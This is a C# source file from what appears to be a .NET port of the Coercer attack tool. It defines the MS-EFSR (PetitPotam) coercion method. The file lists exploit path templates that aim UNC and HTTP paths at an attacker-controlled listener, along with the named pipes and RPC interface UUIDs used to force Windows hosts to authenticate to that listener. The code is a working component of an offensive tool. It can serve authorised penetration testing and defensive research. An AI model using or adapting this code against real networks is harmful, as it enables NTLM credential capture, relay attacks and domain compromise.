using Coercer_dotnet.structures;

namespace Coercer_dotnet.methods.MS_EFSR
{
    public abstract class MS_EFSR : Method
    {
        protected MS_EFSR(AuthType authType, string listener) : base(authType, listener) { }
        protected MS_EFSR(AuthType authType, string listener, int port) : base(authType, listener, port) { }
        protected MS_EFSR(AuthType authType, string listener, int httpPort, int smbPort) : base(authType, listener, httpPort, smbPort) { }
        public override string Author => "@topotam77";
        public override ExploitPathTemplate[] ExploitPathTemplates => new ExploitPathTemplate[]
        {
            new(AuthType.SMB, "\\\\{{listener}}{{port}}\\{{8}}\\file.txt\x00"),
            new(AuthType.SMB, "\\\\{{listener}}{{port}}\\{{8}}\\\x00"),
            new(AuthType.SMB, "\\\\{{listener}}{{port}}\\{{8}}\x00"),
            new(AuthType.HTTP, "\\\\{{listener}}{{port}}/{{3}}\\share\\file.txt\x00")
        };
        public override NcanNpAccess[] NcanNpAccesses => new NcanNpAccess[]
        {
            new("\\PIPE\\efsrpc", "df1941c5-fe89-4e79-bf10-463657acf44d", "1.0"),
            new("\\PIPE\\lsarpc", "c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
            new("\\PIPE\\samr", "c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
            new("\\PIPE\\lsass", "c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
            new("\\PIPE\\netlogon", "c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0")
        };
        public override NcacnIpTcpAccess[] NcacnIpTcpAccesses => new NcacnIpTcpAccess[]
        {
            new("df1941c5-fe89-4e79-bf10-463657acf44d", "1.0"),
            new("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0")
        };
        public override Protocol Protocol => new("[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol", "MS-EFSR");
    }
}